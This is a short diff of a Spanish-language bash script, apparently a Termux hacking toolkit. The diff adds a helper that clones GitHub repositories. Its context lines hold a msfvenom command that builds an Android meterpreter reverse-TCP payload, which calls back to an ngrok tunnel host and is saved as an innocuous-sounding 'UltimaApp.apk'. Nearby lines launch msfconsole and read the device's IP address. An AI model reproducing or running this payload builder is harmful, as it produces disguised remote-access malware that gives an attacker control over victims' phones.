@@ -48,8 +48,14 @@ msfconsole -q -r $PREFIX/lib/config-base
 function sess3 {
 read -p "puerto: " puerto
 msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=$puerto R > /sdcard/download/UltimaApp.apk
-} 
+}
 
+
+function clone {
+read -p "nombre del creador: " creado
+read -p "nombre del archivo: " archiv
+git clone https://github.com/$creado/$archiv
+}
 
 ip=$(ifconfig wlan0 | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | grep -v 255)
 
